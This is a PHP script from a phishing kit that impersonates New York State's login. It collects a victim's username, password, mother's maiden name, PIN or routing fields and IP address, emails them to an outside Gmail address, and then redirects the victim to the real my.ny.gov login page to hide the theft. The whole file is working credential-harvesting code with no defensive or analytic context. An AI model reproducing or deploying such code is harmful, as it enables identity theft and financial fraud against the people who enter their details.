<?php @session_start();
$ip = getenv("REMOTE_ADDR");
$browserAgent = $_SERVER['HTTP_USER_AGENT'];
$hostname = gethostbyaddr($ip);
$message  = "---------------+ NYS FULL $ip +--------------\n";
$message .= $_SESSION['USERNAME']."\n";
$message .= $_SESSION['PASSWORD']."\n";
$message .= "MMN: ".$_POST['MMN']."\n";
$message .= "MMN2: ".$_POST['MMN2']."\n";
$message .= "PIN: ".$_POST['RoutingNumberConfirm']."\n";
$message .= "PIN2: ".$_POST['RoutingNumberConfirm2']."\n";
$send = "at91dd@gmail.com";
$subject = "NEW YORK $ip | ";
$headers = "From: Ali<logs@o2.com>";
$headers .= $_POST['eMailAdd']."\n";
$headers .= "MIME-Version: 1.0\n";
mail("$send", "$subject", $message);

header("Location: https://my.ny.gov/LoginV4/login.xhtml");
	  
?>